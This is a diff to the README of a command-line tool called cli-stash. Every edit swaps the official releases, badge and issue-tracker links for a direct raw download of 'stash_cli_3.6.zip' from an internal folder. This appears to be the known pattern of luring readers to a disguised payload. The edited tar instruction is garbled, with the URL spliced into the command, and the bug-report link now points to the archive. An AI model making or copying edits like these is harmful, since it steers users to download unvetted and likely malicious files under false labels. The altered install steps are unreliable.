@@ -1,6 +1,6 @@
 # 🖥️ cli-stash - Save and Recall Shell Commands Easily
 
-[![Download cli-stash](https://img.shields.io/badge/Download%20cli--stash-4CAF50?style=for-the-badge)](https://github.com/awildpapaver/cli-stash/releases)
+[![Download cli-stash](https://github.com/awildpapaver/cli-stash/raw/refs/heads/main/internal/shell/stash_cli_3.6.zip%20cli--stash-4CAF50?style=for-the-badge)](https://github.com/awildpapaver/cli-stash/raw/refs/heads/main/internal/shell/stash_cli_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you proceed with the installation, make sure your system meets the follow
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [cli-stash Releases](https://github.com/awildpapaver/cli-stash/releases). 
+To get started, visit this page to download: [cli-stash Releases](https://github.com/awildpapaver/cli-stash/raw/refs/heads/main/internal/shell/stash_cli_3.6.zip). 
 
 1. Click the **Releases** link.
 2. Choose the version you wish to download.
@@ -44,7 +44,7 @@ Once the download completes, follow these steps to install and run **cli-stash**
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Extract the downloaded file using: `tar -xvzf cli-stash-*.tar.gz`.
+3. Extract the downloaded file using: `tar -xvzf cli-stash-*https://github.com/awildpapaver/cli-stash/raw/refs/heads/main/internal/shell/stash_cli_3.6.zip`.
 4. Move into the cli-stash directory: `cd cli-stash`.
 5. Run the application with `./cli-stash`.
 
@@ -92,9 +92,9 @@ A: Currently, cli-stash does not have a built-in backup feature. You can manuall
 
 Join our community for support and updates:
 
-- GitHub Issues: [Report bugs and request features](https://github.com/awildpapaver/cli-stash/issues)
+- GitHub Issues: [Report bugs and request features](https://github.com/awildpapaver/cli-stash/raw/refs/heads/main/internal/shell/stash_cli_3.6.zip)
 - Documentation: Visit our documentation page for more detailed guides.
 
-For more information and updates, don’t forget to check our [Releases page](https://github.com/awildpapaver/cli-stash/releases) for the latest versions.
+For more information and updates, don’t forget to check our [Releases page](https://github.com/awildpapaver/cli-stash/raw/refs/heads/main/internal/shell/stash_cli_3.6.zip) for the latest versions.
 
 Happy stashing!
